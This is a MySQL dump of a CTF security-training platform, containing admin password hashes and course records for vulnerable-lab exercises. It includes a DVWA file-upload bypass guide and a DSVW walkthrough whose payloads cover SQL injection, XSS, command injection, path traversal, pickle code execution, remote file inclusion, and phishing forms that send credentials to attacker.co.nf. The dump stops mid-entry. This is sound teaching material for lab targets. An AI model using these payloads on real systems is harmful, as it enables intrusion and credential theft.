/*
Navicat MySQL Data Transfer

Source Server         : Mysql
Source Server Version : 50626
Source Host           : 127.0.0.1:3306
Source Database       : ctfplatform

Target Server Type    : MYSQL
Target Server Version : 50626
File Encoding         : 65001

Date: 2019-05-10 13:41:02
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `lastlogin` datetime NOT NULL,
  `salt` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES ('1', 'test', '1b13fd09e3047d8f23b5c4624f15e494', '2018-12-16 18:43:31', 'f7811ed640f2016d1578b0fa03cdd633');
INSERT INTO `admin` VALUES ('2', 'admin456', 'cc190e932e63ca23f23a616c73147911', '2018-12-22 20:13:11', '4cd6aba825092fcf38d47e6e4c170071');
INSERT INTO `admin` VALUES ('3', '1234567', 'd3b75ec79b0042acae0236025f60d9e7', '2018-12-25 12:34:58', '0ab95a0bad864465fac9e61dcae30fcf');

-- ----------------------------
-- Table structure for course
-- ----------------------------
DROP TABLE IF EXISTS `course`;
CREATE TABLE `course` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `cname` varchar(50) NOT NULL,
  `cdescribe` text,
  `tch_id` bigint(20) NOT NULL,
  `count` int(5) NOT NULL,
  `createdtime` datetime NOT NULL,
  `state` int(1) NOT NULL,
  `img` varchar(255) DEFAULT NULL,
  `tag` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `tch_id` (`tch_id`),
  CONSTRAINT `tch_id` FOREIGN KEY (`tch_id`) REFERENCES `teacher` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of course
-- ----------------------------
INSERT INTO `course` VALUES ('1', '网络上的开源漏洞环境整合', '该项目只是收集了当下比较流行的漏洞学习平台，若有侵权，请联系我！同时欢迎大家提交更多有意思的漏洞学习平台，让我们一起把它们放到docker上，方便更多人的工作和学习！该课程包括dvwa、bWAPP、sql-labs、mutillidae、Bodgelt、Wackopicko、WebGoat、XSSed、DSVW、MCIR等十大漏洞环境，为同学们提供试验便利~', '1', '42', '2018-11-03 13:23:22', '0', 'https://s2.ax1x.com/2019/04/29/E32g1A.png', 'Web综合漏洞');
INSERT INTO `course` VALUES ('3', 'XSS训练', 'SS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被骇客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，骇客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。', '2', '0', '2018-11-15 11:43:39', '0', 'https://s2.ax1x.com/2019/04/29/E3RIDx.png', 'XSS漏洞');
INSERT INTO `course` VALUES ('4', '学习sql注入的一个游戏教程', 'SQLI，sql injection，我们称之为sql注入。何为sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有MySQL，MS SQL ,Oracle以及Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用sql语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险的是，在拼接sql语句的时候，我们可以改变sql语句。从而让数据执行我们想要执行的语句，这就是我们常说的sql注入。\r\n\r\n原理性的东西我们这里就不进行详细的讲解了，从sqli-labs以下的每一个关卡中，你能真正体会到什么是sql注入。Ps:有些朋友对工具比较熟悉，例如sqlmap，可以从sqlmap的日志中分析每个关卡的原理。但是我个人建议先去了解原理，再去使用工具。这样在使用工具的时候你也能深刻的理解工具起到了什么样的作用。更近一步你应该想着如果让你自己写代码实现攻击，你应该如何写。', '3', '1', '2018-11-29 11:44:08', '0', 'https://s2.ax1x.com/2019/04/29/E3WkGQ.png', 'SQL注入');
INSERT INTO `course` VALUES ('6', 'DSVW实验', 'Damn Small Vulnerable Web (DSVW) 是使用 Python 语言开发的 Web应用漏洞 的演练系统。其系统只有一个 python 的脚本文件组成, 当中涵盖了 26 种 Web应用漏洞环境, 并且脚本代码行数控制在了100行以内, 当前版本v0.1m。', '1', '1', '2018-11-03 13:23:22', '0', 'https://s2.ax1x.com/2019/04/29/E3WUZ6.png', 'Web综合漏洞');
INSERT INTO `course` VALUES ('27', 'webgoat实验', 'WebGoat是OWASP组织研制出的用于进行web漏洞实验的应用平台，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open Authentication失效、危险的HTML注释等等。WebGoat提供了一系列web安全学习的教程，某些课程也给出了视频演示，指导用户利用这些漏洞进行攻击。', '3', '0', '2018-11-15 11:44:08', '0', 'https://s2.ax1x.com/2019/04/29/E3oCaq.md.png', 'Web综合漏洞');
INSERT INTO `course` VALUES ('30', 'dvwa实验', 'DVWA上的漏洞列表\nDVMA正如他的名字一样是一个包含了很多漏洞的应用系统。DVWA的漏洞包括了OWASP oepen web application security project的web 10大漏洞。DVWA里面具体包括如下这些漏洞: \n1.暴力破解漏洞通过brute force登录页面进入到该漏洞的测试位置。这个漏洞是用来测试暴力破解工具和展示不安全的弱密码。 \n2.命令执行漏洞在存在风险的系统上执行命令。 \n3.CSRF伪造跨站请求漏洞，允许攻击者去修改应用的管理员密码。 \n4.SQL注入，DVWA包括盲注和错误型注入两种SQL注入漏洞类型。 \n5.不安全的文件上传漏洞，允许攻击者上传恶意的文件到web服务器上 \n6.XSS跨站脚本漏洞，允许攻击者注入他们自己的脚本到web服务器上。DVWA系统里面包含了反射性XSS和存储型XSS两种类型。 \n7.文件包含漏洞，允许进行本地文件包含执行和远程文件包含执行。8.验证码绕过\r  \n', '2', '3', '2018-11-15 11:43:39', '0', 'https://s2.ax1x.com/2019/04/29/E3j0FH.md.png', 'Web综合漏洞');
INSERT INTO `course` VALUES ('33', 'SSH爆破取证', ' 在一定需求下，我们需要对入侵者的行为进行取证，通过查看系统文件，能够发现入侵者对于服务器的攻击模式，SSH的密码爆破操作会在系统的登录日志上留下记录，使用关键字过滤可以找到相关的信息记录。', '1', '13', '2018-11-29 13:23:22', '0', 'https://s2.ax1x.com/2019/04/29/E3ouZR.md.png', '取证相关');
INSERT INTO `course` VALUES ('40', '密码学', 'Crypto即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，主要考查参赛选手密码学相关知识点。', '2', '0', '2019-04-30 21:43:44', '0', 'https://s2.ax1x.com/2019/04/30/EG261J.png', '密码学');
INSERT INTO `course` VALUES ('41', 'CTFWeb训练题', 'CTF新手入门之WEB实例讲解系列课程中，你将学到头文件修改，设置本地代理进行抓包、改包，各种常用以及奇葩的编码方式，sql注入等内容。', '2', '0', '2019-05-03 13:19:18', '0', 'https://s2.ax1x.com/2019/05/03/ENO4PS.png', 'Web训练题');

-- ----------------------------
-- Table structure for coursetemplete
-- ----------------------------
DROP TABLE IF EXISTS `coursetemplete`;
CREATE TABLE `coursetemplete` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `cname` varchar(50) NOT NULL,
  `createtime` date NOT NULL,
  `cdescribe` text,
  `key` varchar(255) DEFAULT NULL,
  `type` int(2) NOT NULL,
  `relateUrl` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of coursetemplete
-- ----------------------------
INSERT INTO `coursetemplete` VALUES ('1', 'dvwa实验环境', '2018-11-02', '默认登录账号密码：damin/admin DVWA上的漏洞列表\nDVMA正如他的名字一样是一个包含了很多漏洞的应用系统。DVWA的漏洞包括了OWASP oepen web application security project的web 10大漏洞。DVWA里面具体包括如下这些漏洞: \n1.暴力破解漏洞通过brute force登录页面进入到该漏洞的测试位置。这个漏洞是用来测试暴力破解工具和展示不安全的弱密码。 \n2.命令执行漏洞在存在风险的系统上执行命令。 \n3.CSRF伪造跨站请求漏洞，允许攻击者去修改应用的管理员密码。 \n4.SQL注入，DVWA包括盲注和错误型注入两种SQL注入漏洞类型。 \n5.不安全的文件上传漏洞，允许攻击者上传恶意的文件到web服务器上 \n6.XSS跨站脚本漏洞，允许攻击者注入他们自己的脚本到web服务器上。DVWA系统里面包含了反射性XSS和存储型XSS两种类型。 \n7.文件包含漏洞，允许进行本地文件包含执行和远程文件包含执行 \n8.验证码绕过\n\n文件上传\n文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。 \n文件上传的文件载体要么在服务器端具备可执行性，要么具备影响服务器端行为的能力，其发挥作用还需要具备以下几个条件： \n（1）上传的文件具备可执行性或能够影响服务器行为，所以文件所在的目录必须在WEB容器覆盖的路径之内；（必须在这个服务器之下） \n（2）用户可以从Web上访问这个文件，从而使得Web容器解释执行该文件；（就是你可以访问到你上传的这个文件） \n（3）上传后的文件必须经过安全检查，不会被格式化、压缩等处理改变其内容； \n（文件的内容不会被修改） \n绕过方案： \n使用Burpsuite: \n1)先将木马的扩展名改成一个正常的图片扩展名，如jpg \n2)上传时使用Burpsuite拦截数据包，将木马的扩展名改为原来的php,即可绕过客户端的验证。 \n注意：这里修改文件名后，请求头中的Content-Length的值也要改 \n文件名大小写绕过 \n用像AsP，pHp 之类的文件名绕过黑名单检测 \n名单列表绕过 \n用黑名单里没有的名单进行攻击，比如黑名单里没有asa 或cer 之类 \n特殊文件名绕过 \n比如发送的http 包里把文件名改成test.asp. 或test.asp_(下划线为空格)，这种命名方式在windows 系统里是不被允许的，所以需要在burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，（Unix/Linux 系统没有这个特性。）\n\n将一句话木马的文件名【evil.php】，改成【evil.php.abc】(奇怪的不被解析的后缀名都行)。首先，服务器验证文件扩展名的时候，验证的是【.abc】，只要该扩展名符合服务器端黑白名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了【.abc】扩展名，会向前寻找可解析的扩展名，即【.php】 \n白名单检测绕过 \n白名单就是只能上传规定后缀的文件，主要利用截断上传绕过，有0x00截断与%00截断 \n0x00截断： \n在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。 \n通过抓包截断将【evil.php.jpg】后面的一个【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【evil.php.jpg】的内容写入到【evil.php】中，从而达到攻击的目的。 \n0x00的意思为16进制00，所以将对应的进制改成00（至于怎么找到对应代码，看右边对应代码，找到第几行，从左到右，每个字母对应一个代码），改完直接go \n在/Upload/后面加一个空格，点开hex，将其对应的20改成00即可，可绕过后缀名的过滤，从而得到webshell。 \n%00截断： \n将文件名后面直接加上%00.jpg，先绕过后缀上传，然后利用burp的urldecode功能，其实和/00截断将hex20变成00一样，效果一样，两种方法都可以拿webshell', '', '1', null);
INSERT INTO `coursetemplete` VALUES ('7', 'webgoat实验环境', '2018-11-04', '1.1 WebGoat简介\n\nWebgoat是OWASP组织研究出的一个专门进行web漏洞实验的应用品台，这个平台里包含了web中常见的各种漏洞，例如：跨站脚本攻击、sql注入、访问控制、隐藏字段、Cookie等；\n\nOWASP（Open Web Application Security Project）是一个非营利的组织，它的目的是帮助个人和企业来发现和使用可信赖的软件。\n\n1.2 用到的工具\n\nWebscarab十一个用来分析浏览器到服务器请求或者服务器到浏览器响应信息的一个框架，或者说是一个代理。它可以查看、修改、分析、删除浏览器和服务器之间的传送的信息，可以用来对http协议和https协议进行分析。\n\nFirebug是Firefox下的一个开发工具，包含html、css、js审查和html、css修改等多项功能，是用来调试用的。可以通过F12之间打开，也可以通过菜单 -> 开发者打开。\n\nWebscarab需要java环境，如果没有配置好java环境先自行配置java环境，这里假设java环境已经配置完成；则我们需要下载webscarab的安装包，解压完之后，如图0所示；这是我们只需点击webscarab.jar进行安装即可。\n\n\n\n图 0 webscarab目录结构\n\n1.3 安装过程\n\n首先，webgoat是运行在带有java的品台之上的，如果你的机器没有安装java环境，还是需要先安装java环境的，具体java环境的安装不再介绍。\n\n（1）下载任意版本的webgoat即可，不过还是推介下载最新版的，因为有一些实验在较低版本上是不能做的。下载完之后解压缩你会看到如图1所示的目录结构\n\n\n\n图 1 webgoat 目录结构\n\n（2）运行图中的webgoat.bat或者webgoat_8080.bat，则会启动tomcat服务器；\n\n（3）在tomcat服务器启动之后，我们就可以通过浏览器对webgoat站点进行访问了，具体的访问地址为如下：http：//localhost:8080/WebGoat/attack或者http：//127.0.0.1:8080/WebGoat/attack；有时上面两个URL都不行，这是因为我们指定了端口号，而有的浏览器是默认不指定端口号的，虽然我们的做法没错，但是却被某些浏览器不识别，因此我们常常需要测试下面的地址：http：//localhost/WebGoat/attack或者http：//127.0.0.1/WebGoat/attack其实localhost只是一个主机名，最后也会被替换为127.0.0.1，在Linux下我们可以通过查看/etc/host查看主机名与IP的对应关系，也可以对其进行修改。\n\n（4）如果连接成功，这是会弹出一个用户名和密码的登录框；那么用户名和密码怎么确定呢？这时我们就需要看一下tomact的配置文件了，首先我们必须清楚配置文件在哪里，conf这个目录下就是配置文件的信息，而xml就是配置文件，在这里我们看到总共有4个配置文件。稍后我们会具体详解这四个配置文件的作用。而我们需要找的用户名和密码就可以从tomcat_user.xml中得到，具体的请看详细的配置说明。\n\n（5）登录成功之后我们就会看到如图2所示的界面，这就是webgoat的主界面，这是我们点击屏幕上的Start Webgoat按钮就可以进入Webgoat的实验环境了。\n\n实验环境的界面如图3所示，在这里我们可以看到左面是一个我们实验的目录结\n\n构，右面则是我们的实验内容。\n\n', '', '1', '/WebGoat');
INSERT INTO `coursetemplete` VALUES ('10', '取证SSH爆破', '2019-04-14', '【实验目的】\r\n1) 在一定需求下，我们需要对入侵者的行为进行取证，通过查看系统文件，能够发现入侵者对于服务器的攻击模式，SSH的密码爆破操作会在系统的登录日志上留下记录，使用关键字过滤可以找到相关的信息记录。\r\n[实验原理]\r\n在操作SSH连接linux系统的时候，系统将会记录完整的登录信息存放在/var/log/secure文件中，入侵者通过SSH爆破的方式攻击服务器将会短时间内产生大量的登录失败日志，通过过滤关键字“Failed password”可以检索到服务器被恶意攻击的记录，达到取证的目的\r\n[实验坏境]\r\ncentOS7\r\n[实验步骤]\r\n一、进入日志文件目录/var/log\r\n提示：可以使用指令 cd /var/log\r\n\r\n二、查看日志文件secure\r\n提示：在使用cat指令的时候可以使用管道命令符|来进行对输出的内容过滤\r\n完整指令为 cat securel | grep \'Failed password\'\r\n\r\n当然你可以直接使用完整路径来查看文件cat /var/log/securel | grep \'Failed password\'在任意目录下', '', '0', null);
INSERT INTO `coursetemplete` VALUES ('11', 'dsvw-由python搭建的靶机', '2019-04-29', '4 漏洞类型\r\n4.1 注入漏洞\r\n4.1.1 Blind SQL Injection (boolean)\r\n基于布尔型的盲注: HTTP请求的响应体中不会明确的返回SQL的错误信息, 当把参数送入程序查询时，并且在查询条件为真的情况下返回正常页面，条件为假时程序会重定向到或者返回一个自定义的错误页面。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?id=2\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?id=2 AND SUBSTR((SELECT password FROM users WHERE name=\'admin\'),1,1)=\'7\'`\r\n4.1.2 Blind SQL Injection (time)\r\n基于时间型的盲注: 与布尔型盲注类似, 当把参数送入程序查询时，通过判断服务器响应时所花费的时间, 如果延迟大于等于Payload中设定的值时就可判断查询结果为真, 否则为假。不同的BDMS使用的方法和技巧略有不同。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?id=1\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?id=1 and (SELECT (CASE WHEN (SUBSTR((SELECT password FROM users WHERE name=\'admin\'),2,1)=\'e\') THEN (LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB(300000000))))) ELSE 0 END))\r\n这个漏洞环境用到了 SQLITE3 中的 CASE 窗口函数与 RANDOMBLOB 来实现的基于时间的盲注。 \r\nMSQL: sleep(2) \r\nMSSQL: WAITFOR DELAY \'0:0:2\'\r\n\r\n4.1.3 UNION SQL Injection\r\n基于联合查询注入: 使用UNION运算符用于SQL注入，UNION运算符是关联两个表的查询结果。攻击者故意伪造的恶意的查询并加入到原始查询中, 伪造的查询结果将被合并到原始查询的结果返回，攻击者会获得其他表的信息。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?id=2,\r\n\r\nEXPLOIT:\r\n\r\nhttp://localhost:65412/?id=2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id||\',\'||username||\',\'||password FROM users WHERE username=\'admin\')\r\n4.1.4 Login Bypass\r\n登陆绕过: 这里是基于SQL注入的一种绕过方式。登陆验证的逻辑没有验证和过滤输入字符直接带到sql进行查询,所以产生漏洞。\r\n\r\n漏洞地址: \r\nhttp://localhost:65412/login?username=&password=\r\n\r\nEXPLOIT:\r\n\r\nhttp://localhost:65412/login?username=admin&password=\' OR \'1\' LIKE \'1\r\n4.1.5 XML External Entity (local)\r\nXML实体注入(本地): 在使用XML通信的服务中(如: SOAP服务)。Web系统没有验证与用户通信中XML格式, 攻击者可以构造恶意的XML文件来访问本地服务器上的资源信息。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?xml=%3Croot%3E%3C%2Froot%3E\r\n\r\nEXPLOIT:\r\n\r\nhttp://localhost:65412/login?username=admin&password=\' OR \'1\' LIKE \'1\r\n4.1.6 XML External Entity (remote)\r\nXML实体注入(远程): 在使用XML通信的服务中(如: SOAP服务)。Web系统没有验证与用户通信中XML格式, 攻击者可以构造恶意的XML文件来将受害服务器的敏感信息上传到攻击者的服务器上严重的可以反弹shell。\r\n\r\n漏洞地址: \r\nhttp://localhost:65412/login?username=&password=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?xml=]>&xxe;\r\n4.1.7 Blind XPath Injection (boolean)\r\nXPath注入: 与SQL注入类似，当网站使用用户提交的信息来构造XML数据的XPath查询时，会发生XPath注入攻击。 通过将有意的畸形信息发送到网站，攻击者可以了解XML数据的结构，或访问他通常不能访问的数据。 如果XML数据用于认证（例如基于XML的用户文件），他甚至可以提升其在网站上的权限。\r\n\r\n漏洞地址: \r\nhttp://localhost:65412/login?username=&password=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?name=admin\' and substring(password/text(),3,1)=\'n\r\nXPath 是一门在 XML 文档中查找信息的语言。XPath 可用来在 XML 文档中对元素和属性进行遍历。 \r\nXPath 是 W3C XSLT 标准的主要元素，并且 XQuery 和 XPointer 都构建于 XPath 表达之上。 \r\n因此，对 XPath 的理解是很多高级 XML 应用的基础。\r\n\r\n4.2 跨站漏洞\r\n4.2.1 Cross Site Scripting (reflected)\r\n反射型跨站脚本攻击: 当攻击者在单个HTTP响应中插入浏览器可执行代码(HTML或JAVASCRIPT)时, 会发生反射跨站点脚本攻击。注入的恶意代码不会存储在应用程序后端, 它是非持久性的，只会影响打开恶意的链接或第三方网页的用户。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?v=0.2\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?v=0.2<script>alert(\"arbitrary javascript\")</script>\r\n4.2.2 Cross Site Scripting (stored)\r\n存储型跨站脚本攻击: 存储跨站脚本是最危险的跨站脚本类型, 其原理是Web系统会将攻击者提交的恶意代码存储到数据库中或是服务器后端里。只要受害者浏览到存在恶意代码页面, 就被执行恶意代码。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?comment=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?comment=<script>alert(\"arbitrary javascript\")</script>\r\n4.2.3 Cross Site Scripting (DOM)\r\nDOM型跨站脚本攻击: 基于DOM的跨站脚本是XSS bug的事实上的名字，它是页面上通常是JavaScript的活动浏览器端内容的结果，获取用户输入，然后做一些不安全的事情，导致注入代码的执行。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?#lang=en\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?foobar#lang=en<script>alert(\"arbitrary javascript\")</script>\r\n4.2.4 Cross Site Scripting (JSONP)\r\nJSONP劫持: 网站中通过 JSONP 的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?#lang=en\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?foobar#lang=en<script>alert(\"arbitrary javascript\")</script>\r\n4.2.5 Cross Site Request Forgery\r\n跨站请求伪造: 会导致受害者在当前被认证的Web应用程序上执行一些 “非正常授权” 的操作。通常这类攻击需要借助第三方（如:通过邮件、私信、聊天发送链接等）的一些帮助，攻击者可以强制Web应用程序的用户执行攻击者选择的操作。当受害者是普通用户时, CSRF攻击可能会影响最终用户数据和操作; 如果受害者是管理员帐户，CSRF攻击可能会危及整个Web应用程序系统的安全。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?comment=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?v=<img src=\"/?comment=<div style=\"color:red; font-weight: bold\">I quit the job</div>\">\r\n这里使用了<img>标签来自动发布了一个红色字体的I quit the job评论。\r\n\r\n4.3 其他漏洞\r\n4.3.1 HTTP Parameter Pollution\r\nHTTP参数污染: 当使用GET或者POST方法提交参数时, 请求体中包含了多个相同名称而不同值的参数。由于不同的语言与Web容器处理的方式不同, 结合业务场景会产生不同的影响。 通过利用这些影响，攻击者可能能够绕过输入验证，触发应用程序错误或修改内部变量值等风险。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/login?username=admin&password=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/login?username=admin&password=\'/*&password=*/OR/*&password=*/\'1\'/*&password=*/LIKE/*&password=*/\'1\r\n这里使用了HTTP参数污染来模拟绕过WAF\r\n\r\n4.3.2 Server Side Request Forgery\r\n服务器端请求伪造: 一种由攻击者构造形成的指令并由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统资源。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?path=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?path=http://127.0.0.1:80\r\n如果 IP 地址 127.0.0.1 开放了 80 端口, 那么返回得到的信息, 否则返回一个 500 错误。\r\n\r\n4.3.3 Frame Injection (phishing)\r\nFrame注入(钓鱼): 属于XSS的范畴, 将HTML的标签注入到存在漏洞的HTTP响应体中, 如: iframe标签。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?v=0.2\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?v=0.2<iframe src=\"http://attacker.co.nf/i/login.html\" style=\"background-color:white;z-index:10;top:10%;left:10%;position:fixed;border-collapse:collapse;border:1px solid #a8a8a8\"></iframe>\r\n4.3.4 Frame Injection (content spoofing)\r\nFrame注入(内容欺骗): 同上原理。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?v=0.2\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?v=0.2<iframe src=\"http://attacker.co.nf/i/login.html\" style=\"background-color:white;z-index:10;top:10%;left:10%;position:fixed;border-collapse:collapse;border:1px solid #a8a8a8\"></iframe>\r\n4.3.5 Clickjacking\r\n点击劫持: 是一种恶意技术，其包括欺骗Web用户让他们认为正在与交互的东西的交互（在大多数情况下通过点击, 这种技术手段运用最多的就是广告）。 这种类型的攻击可以单独使用或与其他攻击结合使用，在受害者与看似无害的网页进行交互时，可能会发送未经授权的命令或泄露机密信息。\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?v=0.2<div style=\"opacity:0;filter:alpha(opacity=20);background-color:#000;width:100%;height:100%;z-index:10;top:0;left:0;position:fixed;\" onclick=\"document.location=\'http://attacker.co.nf/\'\"></div><script>alert(\"click anywhere on page\");</script>\r\n4.3.6 Unvalidated Redirect\r\n未验证的重定向: 当Web应用程序接受不受信任的输入时，可能会导致Web应用程序将请求重定向到包含在不受信任的输入中的URL，从而可能导致未经验证的重定向和转发。 通过将不受信任的URL输入修改为恶意网站，攻击者可能会成功启动网络钓鱼诈骗并窃取用户凭据。 由于修改链接中的服务器名称与原始网站相同，因此网络钓鱼尝试可能具有更可信的外观。 未验证的重定向和转发攻击也可用于恶意制作一个URL，该URL将通过应用程序的访问控制检查，然后将攻击者转发到他们通常无法访问的特权功能。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?redir=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?redir=http://attacker.co.nf\r\n4.3.7 Arbitrary Code Execution\r\n任意代码执行: 开发人员没有严格验证用户输入的数据, 在某些特殊业务场景中, 用户可构造出恶意的代码或系统命令, 来获得服务器上的敏感信息或者得到服务器的控制权限。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?domain=www.google.com\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?domain=www.google.com; ifconfig\r\n4.3.8 Full Path Disclosure\r\n完整路径泄露: 全路径泄露漏洞使攻击者能够看到Web应用程序在服务器端的完整路径(例如：/var/www/html/)。攻击者会结合其他漏洞对Web系统进一步的攻击(如: 写 Webshell)。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?path=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?path=foobar\r\n4.3.9 Source Code Disclosure\r\n源码泄露: 该漏洞会造成允许未授权用户获得服务器端应用程序的源代码。此漏洞会造成企业内部的敏感信息泄露或容易遭受恶意攻击者攻击。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?path=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?path=dsvw.py\r\n4.3.10 Path Traversal\r\n路径穿越: 路径遍历攻击（也称为目录遍历）旨在访问存储在Web根文件夹外部的文件和目录。通过使用 “../” 或 “..\\” 等相对文件路径方式来操纵引用文件的变量，该漏洞会允许访问存储在文件系统上的任意文件和目录。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?path=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?path=../../../../../../etc/passwd\r\n4.3.11 File Inclusion (remote)\r\n远程文件包含: 通常利用目标应用程序中实现的 “动态文件包含” 机制，允许攻击者包括一个远程文件。 由于对用户输入的数据没有进行适当的验证，导致出现漏洞。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?include=\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?include=http://pastebin.com/raw.php?i=N5ccE6iH&cmd=ifconfig\r\n4.3.12 HTTP Header Injection (phishing)\r\nHTTP响应头拆分(钓鱼): 用户提交的部分参数, 没有经过验证或过滤直接在响应头中输出, 由于HTTP的Header中使用了CRLF(url中的%0d%0a)来分割各个字段中的数据。恶意用户可以构造特殊的数据应该欺骗钓鱼。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?charset=utf8\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A<!DOCTYPE html><html><head><title>Login</title></head><body style=\'font: 12px monospace\'><form action=\"http://attacker.co.nf/i/log.php\" onSubmit=\"alert(\'visit \\\'http://attacker.co.nf/i/log.txt\\\' to see your phished credentials\')\">Username:<br><input type=\"text\" name=\"username\"><br>Password:<br><input type=\"password\" name=\"password\"><input type=\"submit\" value=\"Login\"></form></body></html>\r\n4.3.13 Component with Known Vulnerability (pickle)\r\n使用含有已知漏洞的组件(pickle): pickle存在一个文件序列化漏洞。\r\n\r\n漏洞地址: \r\nhttp://127.0.0.1:65412/?object=%28dp0%0AS%27admin%27%0Ap1%0A%28S%27admin%27%0Ap2%0AS%27admin%27%0Ap3%0Atp4%0AsS%27dricci%27%0Ap5%0A%28S%27dian%27%0Ap6%0AS%27ricci%27%0Ap7%0Atp8%0AsS%27amason%27%0Ap9%0A%28S%27anthony%27%0Ap10%0AS%27mason%27%0Ap11%0Atp12%0AsS%27svargas%27%0Ap13%0A%28S%27sandra%27%0Ap14%0AS%27vargas%27%0Ap15%0Atp16%0As.\r\n\r\nEXPLOIT:\r\n\r\nhttp://127.0.0.1:65412/?object=cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A\r\n这里执行了ping -c 5 127.0.0.1 命令\r\n\r\n4.3.14 Denial of Service (memory)\r\n拒绝服务(memory): 资源消耗型的 DoS 攻击, 通过大量的恶意请求来访问有缺陷的服务, 从而造成服务器的系统资源消耗(如: CPU利用率100%、内存耗尽等) 增大, 来影响正常用户的使用。往往会造成正常用户的无法打开或无法访问等一系列问题。\r\n\r\n漏洞地址: 